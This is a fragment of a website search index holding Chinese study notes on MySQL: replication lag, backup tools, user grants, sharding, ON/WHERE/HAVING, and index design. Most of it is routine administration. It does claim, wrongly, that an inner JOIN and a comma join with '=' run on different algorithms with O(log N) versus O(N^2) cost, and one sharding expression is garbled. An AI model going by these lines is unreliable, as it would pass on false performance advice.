主从同步延迟的原因 当数据库主库有较大更新并发操作时，可能会导致主从同步延迟， 因为从库里面读取 binlog 的线程仅有一个， 当某个 SQL 在从库上执行的时间稍长或者由于某个SQL 要进行锁表就会导致主从同步延迟， 主库的SQL大量积压，未被同步到从库里。这就导致了主从不一致，也就是主从延迟。 主从同步延迟的解决办法 解决主从复制延迟有几种常见的方法： 写操作后的读操作指定发给数据库主库 例如，注册账号完成后，登录时读取账号的读操作也发给数据库主库。 这种方式和业务强绑定，对业务的侵入和影响较大，如果哪个新来的程序员不知道这样写代码，就会导致一个bug。 读从库失败后再读一次主库 这就是通常所说的\"二次读取\"，二次读取和业务无绑定，只需要对底层数据库访问的 API 进行封装即可， 实现代价较小，不足之处在于如果有很多二次读取，将大大增加主库的读操作压力。 例如，黑客暴力破解账号，会导致大量的二次读取操作，主库可能顶不住读操作的压力从而崩溃。 关键业务读写操作全部指向主库，非关键业务采用读写分离 例如，对于一个用户管理系统来说，注册+登录的业务读写操作全部访问主库， 用户的介绍、爱好、等级等业务，可以采用读写分离， 因为即使用户改了自己的自我介绍，在查询时却看到了自我介绍还是旧的，业务影响与不能登录相比就小很多，业务上一般可以接受。","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Master-and-Synchronous.html","loc":"/yq-doc-source-docs-database-mysql-Master-and-Synchronous.html"},{"title":"mysql 备份方案","text":"全量备份 方案一： sql实现 sql 语句实现: mysqldump --lock-all-tables --flush-logs --master-data=2 -u $username -p $password $database_name > $bak_file 参数解释 --lock-all-tables 对于InnoDB将替换为 --single-transaction。 该选项在导出数据之前提交一个 BEGIN SQL语句， BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。 它只适用于事务表，例如 InnoDB 和 BDB。 本选项和 --lock-tables 选项是互斥的，因为 LOCK TABLES 会使任何挂起的事务隐含提交。 要想导出大表的话，应结合使用 --quick 选项。 --flush-logs 结束当前日志，生成并使用新日志文件 --master-data --master-data=2 . 该选项将会在输出SQL中记录下完全备份后新日志文件的名称，用于日后恢复时参考， 例如输出的备份SQL文件中含有: CHANGE MASTER TO MASTER_LOG_FILE='MySQL-bin.000002', MASTER_LOG_POS=106; --all-databases 备份所有数据库，备份单个库直接跟库名 --databases 指定多个数据库 --quick , -q 该选项在导出大表时很有用， 它强制 MySQLdump 从服务器查询取得记录直接输出而不是取得所有记录后将它们缓存到内存中。 --ignore-table 忽略某个数据表，如 --ignore-table test.user 忽略数据库test里的user表 注解 对于mysqldump备份的数据, 可以直接进数据库执行: source bak.sql 恢复 命令大小写不敏感, 库名大小写敏感 方案二： django角度实现 备份: python manage.py dumpdata $app >$bak_file 恢复: python manage.py loaddata $bak_file 方案三： oracle商业软件mysqlbackup实现（可能需付费下载） 完整备份: mysqlbackup --defaults-file=$mysqld_cnf_file --socket=$socket_file --with-timestamp --user=$user --password=$password --backup-dir=$backup_dir backup-and-apply-log --defaults-file mysql配置文件目录 --socket socket目录 （默认不用输入，一般会找默认的） --with-timestamp 以时间来生成文件名 --user 用户 --password 密码 --backup-dir 备份文件目录 backup-and-apply-log 备份并检查日志文件 完整备份恢复: # copy-back 把back-dir复制到datadir中 mysqlbackup --defaults-file=$mysqld_cnf_file --datadir=$sys_mysql_data_dir --backup-dir=$backup_dir copy-back --datadir 当前数据库相应的数据文件所在位置 --backup-dir 当前备份文件所在目录 copy-back 把back-dir复制到datadir中 注解 在恢复时报错未找到innodb配置，两种方法解决， 第一种在mysqld.cnf添加innodb的配置文件，具体配置在备份文件backup-my.cnf中， 第二种方法直接将 --defaults-file指定到备份文件的backup-my.cnf目录 在还原后，修改mysql这个目录和mysql里面的文件内容都把权限修改成mysql,否mysql无法启动 增量备份 方案一： bin-log 增量备份 备份大概顺序 确认数据库开启 log_bin 链接数据库刷新日志，执行 flush-logs 备份旧的 bin-log 文件 恢复备份大概顺序 还原旧的 bin-log 文件 执行mysqlbinlog 恢复， 如: mysqlbinlog --no-defaults $log_bin_file 注解 若需定时操作，linux可加crontab定时器 方案二：mysqlbackup实现 说明，mysqlbackup是mysql企业版功能，oracle商业软件，需要付费使用 下载地址: https://www.mysql.com/downloads/ 备份 多文件备份流程（推荐使用多文件的，就是恢复需要整理成单文件，此处就不写单文件流程了，基本一致） 第一次增量备份: mysqlbackup --defaults-file=$socket_file --user=$user --password --with-timestamp --incremental --incremental-base=dir:$base_bak_dir --incremental-backup-dir=$true_bak_dir backup --incremental 表示增量备份 --incremental-base 基于哪个备份的备份 --incremental-backup-dir 增量备份的备份存放目录 第二次增量备份 mysqlbackup --defaults-file=$socket_file --with-timestamp --user=$user --password --incremental --incremental-base=dir:$base_bak_dir --incremental-backup-dir=$true_bak_dir backup 注解 第二次 incremental-base 的位置是第一次增量备份的位置 恢复增量备份 使用apply-log将完整备份做成最终备份: mysqlbackup --backup-dir=$res_bak_file apply-log 将第一次增量备份备份完整备份中: mysqlbackup --incremental-backup-dir=$first_bak_dir --backup-dir=$res_bak_file apply-incremental-backup 将第二次增量备份备份到完整备份中: mysqlbackup --incremental-backup-dir=$second_bak_dir --backup-dir=$res_bak_file apply-incremental-backup 物理还原: mysqlbackup --defaults-file=/etc/mysql/mysql.cond.d/mysqld.cnf --backup-dir=$res_bak_file copy-back 注解 apply-incremental-backup 每一个增量备份刷新日志 方案三：开源工具 xtraback 实现增量备份 xtraback优点 备份速度快，物理备份可靠 备份过程不会打断正在执行的事务（无需锁表） 能够基于压缩等功能节约磁盘空间和流量 自动备份校验 还原速度快 可以流传将备份传输到另外一台机器上 在不增加服务器负载的情况备份数据 下载地址: https://www.percona.com/downloads/XtraBackup/LATEST/ 说明 Xtrabackup中主要包含两个工具： xtrabackup：是用于热备innodb，xtradb表中数据的工具，不能备份其他类型的表，也不能备份数据表结构； innobackupex：是将xtrabackup进行封装的perl脚本，提供了备份myisam表的能力。 常用选项: --host 指定主机 --user 指定用户名 --password 指定密码 --port 指定端口 --databases 指定数据库 --incremental 创建增量备份 --incremental-basedir 指定包含完全备份的目录 --incremental-dir 指定包含增量备份的目录 --apply-log 对备份进行预处理操作 一般情况下，在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据文件仍处理不一致状态。\"准备\"的主要作用正是通过回滚未提交的事务及同步已经提交的事务至数据文件也使得数据文件处于一致性状态。 --redo-only 不回滚未提交事务 --copy-back 恢复备份目录 增量备份, 基于全量备份的增量备份与恢复 做一次增量备份（基于当前最新的全量备份）: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --incremental /backups/ --incremental-basedir=$whole_bak_dir 准备基于全量: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --apply-log --redo-only $whole_bak_dir 准备基于增量: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --apply-log --redo-only $whole_bak_dir --incremental-dir=$increase_dir 增量备份恢复: innobackupex --copy-back --defaults-file=$mysqld_cnf_file $bak_dir 解释: $whole_bak_dir 指的是完全备份所在的目录。 $increase_dir 指定是第一次基于 $whole_bak_dir 增量备份的目录， 其他类似以此类推，即如果有多次增量备份。每一次都要执行如上操作。 注解 增量备份仅能应用于InnoDB或XtraDB表，对于MyISAM表而言，执行增量备份时其实进行的是完全备份。 此节参考: xtrabackup的配置使用 其他工具-MyDumper 相对于 MySQL 官方提供的逻辑备份工具 mysqldump, mydumper 最突出的特性就是可采用多线程并行备份，极大提高了数据导出的速度。 使用: mydumper -h $host -u $user -p $password --database $db --tables-lists $tables --compress --threads 4 --outputdir $path # 少一个 --tables-lists $tables 就是全库备份 mydumper -h $host --database $db --compress --threads 4 --outputdir $path --defaults-file=$passfile -c , --compress 压缩输出文件 -m , --no-schemas 不导出表结构 -t , --threads 使用的线程数量 -F , --chunk-filesize 将表数据分割成这个输出大小的块，单位默认是MB","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-MySQL-backup-solution.html","loc":"/yq-doc-source-docs-database-mysql-MySQL-backup-solution.html"},{"title":"查询选项","text":"union 去重查询 union all 不去重查询 distinct 字段去重 非交互式查询 命令行直接查询: # 如果是文件 mysql -u $user -p $pass < $file.sql # 不是文件 echo \"$sql\" | mysql -u $user -p$pass 如果把账号密码放到一个文件: # pwd.cnf [client] user=root password=root 命令行直接查询: # 如果是sql语句文件 mysql --defaults-extra-file=pwd.cnf < $file.sql # 如果不是 echo \"$sql\" | mysql --defaults-extra-file=pwd.cnf 空间占用查询 查询所占空间: select table_schema as '数据库', sum(table_rows) as '记录数', sum(truncate(data_length/1024/1024, 2)) as '数据容量(MB)', sum(truncate(index_length/1024/1024, 2)) as '索引容量(MB)' from information_schema.tables where table_schema='mysql'; 使用optimize命令查询空间占用: optimize table tb_report_inventory; 注解 使用的时间比较长，需要耐心等待。 optimize执行时会将表锁住，所以不要在高峰期使用。也不要经常使用，每月一次就足够了 查询数据库连接 SQL: show processlist; 显示当前正在执行的进程或会话的列表以及与每个进程相关的一些信息. 会返回一个结果集，其中包含以下信息： Id 表示连接的唯一标识符。 User 表示连接使用的数据库用户。 Host 表示连接的主机名或 IP 地址。 db 表示连接当前正在使用的数据库。 Command 表示连接正在执行的 SQL 命令类型，如 Query、Sleep、Binlog Dump 等。 Time 表示连接已经执行的时间（以秒为单位）。 State 表示连接的当前状态，如 Running、Locked、Sending data 等。 Info 表示连接当前正在执行的 SQL 语句或操作的描述。 监视数据库连接和识别潜在问题非常有用 mysql8.0下实际使用记录 创建用户: create user 'username'@'%' identified by 'password'; username 用户名 % 主机名，本机可用localhost，%表示所有（通配符） 查看用户权限: show grants for username@localhost; 为username@localhost赋予超级用户权限: grant all privileges on *.* to username@localhost with grant option; grant 授权 all privileges 所有权限 on *.* 所有数据库，所有表 to username@localhost 哪个用户的哪个主机 with grant option 是否将username自身的权限赋予其他账户 普通用户权限添加: grant usage,select,insert,update,delete,create temporary tables,execute on jikedb.* to username@localhost; //此时没有with grant option 表示不给其他用户赋权限 flush privileges; usage:无权限，当你想创建一个没有权限的用户时候，指定usage show:的权限 view:视图的权限(mysql8.0+赋权限出错)ERROR 3619 (HY000): Illegal privilege level specified for VIEW create temporary tables:创建临时表的权限 excute：执行的权限 收回权限: revoke delete on jikedb.* from username@localhost; # 意思是收回username@localhost下jikedb库所有的表的删除操作 新创建的用户username@localhost 要想使用，登录后需要修改密码: alter user username@localhost identified by '12345678' 删除用户: drop user username@localhost; //username，localhost加不加引号都可 有时候需要重载一下表数据: grant reload on *.* to username@'%'; 实际使用2-表的创建修改 创建t1表: mysql> create table t1(id int primary key, name varchar(255), age int); Query OK, 0 rows affected (0.03 sec) 查看创建语句: mysql> show create table t1 \\G; *************************** 1. row *************************** Table: t1 Create Table: CREATE TABLE `t1` ( `id` int NOT NULL, `name` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) ERROR: No query specified 修改表, 增加一个birth字段: mysql> alter table t1 add birth datetime; Query OK, 0 rows affected (0.03 sec) Records: 0 Duplicates: 0 Warnings: 0 查看: mysql> show create table t1 \\G; *************************** 1. row *************************** Table: t1 Create Table: CREATE TABLE `t1` ( `id` int NOT NULL, `name` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, `birth` datetime DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) ERROR: No query specified 其他 select into 写入文件 常用语句(有些上面有了): select now() 查看当前时间 database() 查看当前数据库 version() 查看数据库版本 user() 查看当前登录的数据库用户 sleep(n) 睡眠 n 秒 substr(a, b, c) 对于a字符串，b位置开始，截取长度c的字符 count() 计算总数 ascii(a) 字符a的ascii码 length(a) 字符串a的长度 # 查询数据库版本 select version(); # 使用指定的数据库 use $database_name; # 查看指定表信息 这个好像在8.0有问题... # show table $table_name # 查看指定表的结构 show create table $table_name # 查看指定表的索引 show index from $table_name # 删除表 多个逗号隔开, drop table 单个也可 drop tables $table_name; # 查看SQL查询计划 EXPLAIN 加数据库语句 # 查看各种优化参数开关 select @@optimizer_switch; # 在会话级别设置查询优化器可以看到隐藏索引, # use_invisible_indexes 可以通过上面的 optimizer_switch 看到 set session optimizer_switch=\"use_invisible_indexes=on\"; # 开启一个事务 # begin; # 删除外键约束 DROP FOREIGN KEY <外键约束名> # 查看所有触发器 show triggers\\G; mysql命令: -h host 链接到指定的主机 -u user 用户 -p password 密码","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Query-option.html","loc":"/yq-doc-source-docs-database-mysql-Query-option.html"},{"title":"分库分表","text":"具体情况具体分析, 合理选择策略. 注解 还有 NewSQL 的 单机 到 分布式集群, 不属于分库分表, 而是直接就实现了分布式 分库分表算是一个轻量级的优化解决方案 分库: 将数据分离多个库, 解放数据库IO性能 分表: 将数据分离多个表, 突破单表数据压力 注解 这里提一句, 还有其他优化方案, 比如使用 主从架构 (binlog) 实现 读写分离 业务代码层面, 读写分离只关注路由到读的库, 还是写的库. 分库分表方案 数据分片 常见策略 取模分片。优点：数据存放均匀。缺点：扩容需要大量数据迁移。 按范围分片。优点：扩容不需要迁移数据。缺点：数据存放不均匀，容易产生数据倾斜(比如按月份分, 某月的数据过多, 另一月内数据又过少)。 配置路由, 比如将路由配置信息写到路由表; 缺点是得多查询一次, 以及数据量大时候又回陷入分表循环; 根据业务场景，灵活定制分片策略。--面试重点 垂直拆分 垂直分片： 从业务维度切分扩展数据库连接数 提升数据库IO性能 把单库中的不同表分到不同的库, 再深入点, 把单表的列拆分给多个表 水平拆分 水平分片： 从数据维度切分扩展单表可控数据量 提升数据库查询性能 水平分片从理论上突破了单机数据量处理的瓶颈，并且扩展相对自由，是分库分表的标准解决方案。 如 比如按日期拆分(范围分表), 那在WEB应用的角度怎么查? 可以按照时间, 2021年的查2021年的表... Hash分表 其实就是上面的取模策略. 查id, id计算hash后对多少(比如拆为4张表)取余, 然后决定去哪个表查. 但是有个缺点, 后续如果再拆4个表, 加起来一共八个, 之前的逻辑的混乱了. 所以还要作数据迁移 无热点问题, 但是扩容迁移麻烦. 范围分表 时间分表就是, 比如 1000-2000 w数据在第2张表. 存在热点问题. 比如同时并发在某一个表. 分库分表后如何实现不停机扩容 实际上，不停机扩容，实操起来是个非常麻烦而且很有风险的操作， 当然，面试回答起来就简单很多。 第一阶段：在线双写，查询走老库 建立好新的库表结构，数据写入老库的同时，也写入拆分的新库 数据迁移，使用数据迁移程序，将旧库中的历史数据迁移到新库 使用定时任务，新旧库的数据对比，把差异补齐 第二阶段：在线双写，查询走新库 完成了历史数据的同步和校验 把对数据的读切换到新库 第三阶段：旧库下线 旧库不再写入新的数据 经过一段时间，确定旧库没有请求之后，就可以下线老库 分库分表问题 从分库的角度来讲 事务的问题 使用关系型数据库，君很大一点在于它保证事务完整性。 而分库之后单机事务就用不上了，必须使用分布式事务来解决。 跨库 JOIN 问题 在一个库中的时候我们还可以利用JOIN 来连表查询，而跨库了之后就无法使用JOIN 了 此时的解决方案就是在业务代码中进行关联，也就是先把一个表的数据查出来， 然后通过得到的结果再去查另一张表，然后利用代码来关联得到最终的结果。 这种方式实现起来稍微比较复杂，不过也是可以接受的。 还有可以适当的冗余一些字段。比如以前的表就存储一个关联 ID，但是业务时常要求返回对应的 Name 或者其他字段。 这时候就可以把这些字段冗余到当前表中，来去除需要关联的操作。 还有一种方式就是数据异构，通过binlog同步等方式，把需要跨库join的数据同步到ES的大宽表里去，通过ES直接查询，效率很高。 从分表的角度来看 跨节点的 count,order by.group by 以及聚合函数问题 只能由业务代码来实现或者用中间件将各表中的数据汇总、排序、分页然后返回。 数据迁移，容量规划，扩容等问题 数据的迁移，容量如何规划，未来是否可能再次需要扩容，等等，都是需要考虑的问题。 ID 问题 数据库表被切分后，不能再依赖数据库自身的主键自增生成机制，所以需要一些手段来保证全局主键唯一。 即 案例-主键冲突 还是自增，只不过自增步长设置一下。比如现在有三张表，步长设置为3， 三张表ID 初始值分别是1、2、3。 这样第一张表的ID增长是1、4、7。第二张表是2、5、8。第三张表是3、6、9，这样就不会重复了。 UUID，这种最简单，但是不连续的主键插入会导致严重的页分裂，性能比较差。 分布式ID，比较出名的就是 Twitter 开源的 sonwflake 雪花算法 案例-主键冲突 数据库一般使用整型自增主键, 那么当进行分库分表时, 新的表也是需要主键索引的, 这个时候就会有主键冲突, 如何解决? 有个自定义主键, 雪花 算法, 它让主键只是保持一个增加的趋势, 具体怎么实现的, 后面再研究. 案例-多数据源, 分布式事务问题 分库分表开源框架 ShardingSphere分库分表 京东开源 地址: Apache ShardingSphere 支持: ShardingJDBC: 客户端分库分表 ShardingProxy: 服务端分库分表 实际使用方面来看, 实现是通过配置把多个表、库整合为一个逻辑表、库 支持策略 Inline策略 - 根据单一分片键进行精确分片; 如 SQL: Insert into course values (?,?,?,?) Select * from course where cid = ? Select * from course where cid in ? 注: 此处cid是由雪花算法生成的主键id 分片键: cid尽量不要用id，MyBatis会对id字段默认生成雪花主键 分片算法: m$->{cid%2+1}.course_$-> I ((cid+1) %4).intdiv(2) +1} 真实节点: m$->{1.. 2}.course_$->{1.. 2} Standard策略 - 根据单一分片键进行精确或者范围分片; 如SQL: Select * from course where cid between ? and ? 分片键: cid 分片算法: Precise algorithm + Range algorithm 真实节点: m$->{1.. 2}.course_$->{1.. 2} Complex策略 - 根据多个分片键进行精确或者范围分片; Hint策略 - 使用与SQL无关的方式进行分片; 如查询的cid是奇数 其他: 支持读写分离下的策略配置 案例举例 案例-不同用户端优化 说明: 主要是运营管理端, 如果需要实时可以用es, es中可以只存相关关键查询字段和主键 然后再拿主键去数据库拿. 案例-线上单库不停机迁移 先考虑停机迁移, 可以直接整库迁移, 或者每次迁移1k数据等 但是如果是线上迁移, 期间可能会有业务数据更新. 方案一: 监听binlog binlog记录了对数据库的修改, 阿里有个开源的 canal 组件 , 可以做到监听binlog 然后把binlog的变动解析出来写到新库表. 但是得考虑, 如果监听binlog写到新库表要比迁移的快, 就会造成数据混乱. 解决方案就是用版本啊, 重试机制啥的 迁移后也不能马上全部拿去用, 而是 灰度发布 , 先给部分服务器用. 灰度的周期一般比较短, 因为期间可能有分流的问题, 比如更新的新表, 但是有查询旧表...","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Sub--meter.html","loc":"/yq-doc-source-docs-database-mysql-Sub--meter.html"},{"title":"on、where、Having的区别","text":"注解 连接查询参考: /docs/数据库/mysql/表内外连接 WHERE与HAVING WHERE子句在GROUP BY分组和聚合函数之前对数据行进行过滤； HAVING子句对GROUP BY分组和聚合函数之后的数据行进行过滤。 因此，WHERE子句中不能使用聚合函数。例如，以下语句将会返回错误: -- 查找人数大于 5 的部门 select dept_id, count(*) from employee where count(*) > 5 group by dept_id; 因为在执行WHERE子句时，还没有计算count 另一方面，HAVING子句中不能使用除了分组字段和聚合函数之外的其他字段。例如，以下语句将会返回错误: -- 统计每个部门月薪大于等于 30000 的员工人数 select dept_id, count(*) from employee group by dept_id having salary >= 30000; 因为经过GROUP BY分组和聚合函数之后，不再存在 salary 字段，HAVING子句中只能使用分组字段或者聚合函数 从性能的角度来说，HAVING子句中如果使用了 分组字段 作为过滤条件，应该替换成WHERE子句； 因为WHERE可以在执行分组操作和计算聚合函数之前过滤掉不需要的数据，性能会更好。 下面示例中的语句 1 应该替换成语句 2: -- 语句 1 select dept_id, count(*) from employee group by dept_id having dept_id = 1; -- 语句 2 select dept_id, count(*) from employee where dept_id = 1 group by dept_id; 当然，WHERE和HAVING可以组合在一起使用。例如: select dept_id, count(*) from employee where salary > 10000 group by dept_id having count(*) > 1; dept_id|count(*)| -------|--------| 1| 3| 该语句返回了月薪大于 10000 的员工人数大于 1 的部门； WHERE用于过滤月薪大于 10000 的员工；HAVING用于过滤员工数量大于 1 的部门。 WHERE 与 ON 当查询涉及多个表的关联时，我们既可以使用WHERE子句也可以使用ON子句指定连接条件和过滤条件。这两者之间的主要区别在于： 对于内连接（inner join）查询，WHERE和ON中的过滤条件等效； 对于外连接（outer join）查询，ON中的过滤条件在连接操作之前执行， WHERE中的过滤条件（逻辑上）在连接操作之后执行。 条件查询内连接 对于内连接查询而言，以下三个语句的结果相同: -- 语句 1 select d.dept_name, e.emp_name, e.sex, e.salary from employee e, department d where e.dept_id = d.dept_id and e.emp_id = 10; dept_name|emp_name|sex|salary | ---------|--------|---|-------| 研发部 |廖化 |男 |6500.00| -- 语句 2 select d.dept_name, e.emp_name, e.sex, e.salary from employee e join department d on (e.dept_id = d.dept_id and e.emp_id = 10); dept_name|emp_name|sex|salary | ---------|--------|---|-------| 研发部 |廖化 |男 |6500.00| -- 语句 3 select d.dept_name, e.emp_name, e.sex, e.salary from employee e join department d on (e.dept_id = d.dept_id) where e.emp_id = 10; dept_name|emp_name|sex|salary | ---------|--------|---|-------| 研发部 |廖化 |男 |6500.00| 语句 1 在WHERE中指定连接条件和过滤条件；语句 2 在ON中指定连接条件和过滤条件； 语句 3 在ON中指定连接条件，在WHERE中指定其他过滤条件。 上面语句不但结果相同，数据库的执行计划也相同。以 MySQL 为例，以上语句的执行计划如下: id|select_type|table|partitions|type |possible_keys |key |key_len|ref |rows|filtered|Extra| --|-----------|-----|----------|-----|--------------------|-------|-------|-----|----|--------|-----| 1|SIMPLE |e | |const|PRIMARY,idx_emp_dept|PRIMARY|4 |const| 1| 100| | 1|SIMPLE |d | |const|PRIMARY |PRIMARY|4 |const| 1| 100| | 尽管如此，仍然建议将两个表的连接条件放在ON子句中，将其他过滤条件放在WHERE子句中； 这样语义更加明确，更容易阅读和理解。对于上面的示例而言，推荐使用语句 3 的写法。 条件查询外连接 对于外连接而言，连接条件只能用ON子句表示，因为WHERE子句无法表示外连接的语义。例如: select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id) where d.dept_name = '保卫部'; dept_name|emp_name|sex|salary| ---------|--------|---|------| 保卫部 | | | | 由于\"保卫部\"没有员工，我们需要使用外连接返回部门的信息； WHERE条件用于过滤 dept_id = 6 的数据；此时，员工表中返回的都是 NULL。 注解 Oracle 支持在WHERE子句的右/左侧使用 (+) 表示左/右外连接，但是无法表示全外连接。 对于以上语句，如果将WHERE子句中的过滤条件放到ON子句中，结果将会完全不同: select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id and d.dept_name = '保卫部'); dept_name|emp_name|sex|salary| ---------|--------|---|------| 行政管理部| | | | 人力资源部| | | | 财务部 | | | | 研发部 | | | | 销售部 | | | | 保卫部 | | | | 左外连接返回了所有的部门信息，而且员工信息都为 NULL； 显然，这不是我们期望的结果。我们可以通过执行计划分析一下为什么会这样， 仍然以 MySQL 为例: explain analyze select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id and d.dept_name = '保卫部'); -> Nested loop left join (cost=7.60 rows=30) (actual time=0.098..0.278 rows=6 loops=1) -> Table scan on d (cost=0.85 rows=6) (actual time=0.052..0.057 rows=6 loops=1) -> Filter: (d.dept_name = '保卫部') (cost=0.71 rows=5) (actual time=0.035..0.035 rows=0 loops=6) -> Index lookup on e using idx_emp_dept (dept_id=d.dept_id) (cost=0.71 rows=5) (actual time=0.020..0.032 rows=4 loops=6) 查询计划显示使用 Nested loop left join 方式执行连接操作； 对于 department 使用全表扫描的方式返回 6 行记录； 对于 employee 表采用索引（idx_emp_dept）查找， 同时使用\"d.dept_name = '保卫部'\"作为过滤条件，循环 6 次返回了 0 行记录； 最终返回了上面的结果。 作为对比，我们可以看看将过滤条件放到WHERE子句时的执行计划: explain analyze select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id) where d.dept_name = '保卫部'; -> Nested loop left join (cost=1.98 rows=5) (actual time=0.074..0.078 rows=1 loops=1) -> Filter: (d.dept_name = '保卫部') (cost=0.85 rows=1) (actual time=0.049..0.053 rows=1 loops=1) -> Table scan on d (cost=0.85 rows=6) (actual time=0.039..0.047 rows=6 loops=1) -> Index lookup on e using idx_emp_dept (dept_id=d.dept_id) (cost=1.12 rows=5) (actual time=0.021..0.021 rows=0 loops=1) 查询计划显示使用 Nested loop left join 方式执行连接操作； 对于 department 通过扫描返回 1 行记录（d.dept_name = '保卫部'）； 对于 employee 表采用索引（idx_emp_dept）查找， 同时使用 dept_id=d.dept_id 作为过滤条件，循环 1 次返回了 0 行记录。 注解 一般来说，对于左外连接查询，左表的过滤应该使用WHERE子句， 右表的过滤应该使用ON子句；右外连接查询正好相反；全外连接的过滤条件使用ON子句。 在使用jion时，on和where条件的区别如下： on 条件是在生成临时表时使用的条件，返回on条件匹配的记录。 where 条件是在临时表生成好后，再对临时表进行过滤的条件。 这时已经没有left join的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。 on、where、having这三个都可以加在条件的子句中，on是最先执行，where次之，having最后。 对于内连接，inner join（inner join即join）和 = 等号结果一样，但实现原理完全不同， join是基于hashtable连接比较， 而=直接就是取笛卡尔集再过滤，所以后者效率低，是O(N&#94;2)，前者是O(LogN)。 注解 笛卡尔集, 就是一个表的所有行跟另一个表的所有行全连接 参考: 【MySQL】连接查询 以及 on、where、Having的区别","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-The-difference-between-on,-where,-having.html","loc":"/yq-doc-source-docs-database-mysql-The-difference-between-on,-where,-having.html"},{"title":"索引","text":"数据结构实现 见: /docs/数据库/mysql/索引数据结构 索引分类 数据结构角度 B+ Hash FULL TEXT 物理存储角度 聚簇索引 非聚簇索引 逻辑角度 主键索引(Primary Key): 也叫 聚集索引, 聚簇索引, 是特殊的唯一索引, 不允许空; InnoDB存储引擎的表会存在主键（唯一非null），如果建表的时候没有指定主键， 则会使用第一非空的唯一索引作为聚集索引， 否则InnoDB会自动帮你创建一个不可见的、长度为6字节的row_id用来作为聚集索引。 唯一索引(Unique): 索引列值惟一, 允许空; 索引列的值必须唯一，但允许有空值; 单列索引(Key): 也叫普通索引, 一个索引只包含单个列; 是MySQL中的基本索引类型，允许在定义索引的列中插入重复值和空值; 多列索引: 也叫组合索引; 组合索引指在表的多个字段组合上创建的索引， 列值的组合必须唯一, 只有在查询条件中使用了这些字段的左边字段时， 索引才会被使用。使用组合索引时 遵循最左前缀集合 ; 全文索引(FULLTEXT): 全文索引类型为FULLTEXT，在定义索引的列上支持值的全文查找， 允许在这些索引列中插入重复值和空值。全文索引可以在CHAR、VARCHAR或者TEXT类型的列上创建 注意搜索长度有默认值，参考: MySQL 之全文索引 空间索引(SPATIAL): 空间索引是对空间数据类型的字段建立的索引， MySQL中的空间数据类型有4种，分别是GEOMETRY、POINT、LINESTRING和POLYGON。 MySQL使用SPATIAL关键字进行扩展，使得能够用于创建正规索引类似的语法创建空间索引。 创建空间索引的列必须声明为NOT NULL 注解 遵循最左前缀集合 order by使用索引最左前缀: order by a order by a,b order by a,b,c order by a desc, b desc, c desc 如果where使用索引的最左前缀定义为常量，则order by能使用索引: where a=const order by b,c where a=const and b=const order by c where a=const and b > const order by b,c 不能使用索引进行排序: order by a , b desc ,c desc --排序不一致 where d=const order by b,c --a丢失 where a=const order by c --b丢失 where a=const order by b,d --d不是索引的一部分 where a in(...) order by b,c --a属于范围查询 说明, 当创建一个简单的表: CREATE TABLE my_test ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(50) DEFAULT NULL, `sex` varchar(5) DEFAULT NULL, `address` varchar(100) DEFAULT NULL, `birthday` datetime NOT NULL, `user_num` int(11) unique, PRIMARY KEY (`id`), index(username) ); 会发现明明在建表的时候只创建了一个索引，查询出来的有三个: show index from my_test; 其实 主键，唯一约束列，外键 这些都自动会生成索引，至于外键大家可以去尝试下 注解 上表格中各个列的说明: table #表名称 non_unique #如果索引不能包括重复词，为0，如果可以，则为1 key_name #索引的名称 seq_in_index #索引中的列序号 column_name #列名称 collation #列以什么方式存储在索引中，在mysql中，有值'A'（升序）或者NULL（无分类） cardinality #索引在唯一值的数据的估值，通过运行analyze table xxx_table;或者 myisamchk -a 可以更新，技术根据被存储为整数的统计数据来计数，所以即使对于小型表，该值也没必要是精确的，基数越大，当进行联合所饮食，mysql使用该索引的机会越大。myisam中，该值是准确的，INNODB中该值数据是估算的，存在偏差 sub_part #如果列只是部分的编入索引 则为被编入索引的字符的数目，如果整列被编入索引，则为NULL packed #指示关键词如何被压缩，如果没有被压缩，则为NULL NULL #如果列含有NULL，则含有YES，如果没有，则该列为NO index_type #用过的索引方法（BTREE,FULLTEXT,HASH,RTREE） comment #备注 index_comment #为索引创建时提供了一个注释属性的索引的任何评论 创建索引注意点 索引应该建在查询应用频繁的字段，比如whelre判断、order 排序和join 的（on）字段上创建索引。 索引的个数应该适量，索引需要占用空间，更新时候也需要维护; 一个表中如果有大量的索引，不仅占用磁盘空间，而且会影响INSERT、DELETE、UPDATE等语句的性能， 因为在表中的数据更改的同时，索引也会进行调整和更新; 区分度低的字段，例如性别，不要建索引。 频繁更新的值，不要作为索引，维护索引文件需要成本；还会导致页分裂，I0次数增多。 联合索引把散列性高（区分度高）的值放在前面为了更好的满足最左前缀匹配原则 尽可能用联合索引代替多个单列索引 （对于单列索引，MySQL基本只能使用一个索引，所以经常使用多个条件查询时更适合使用联合索引） 过长的字段，使用前缀索引。当字段值比较长的时候，建立索引会消耗很多的空间，搜索起来也会很慢。 我们可以通过截取字段的前面一部分内容建立索引，这个就叫前缀索引。 不建议用无序的值（例如身份证、UUID）作为索引，在插入时会造成叶子节点频繁分裂，出现磁盘存储的碎片化 数据量小的表最好不要使用索引，由于数据较少，查询花费的时间可能比遍历索引的时间还要短，索引可能不会产生优化效果; 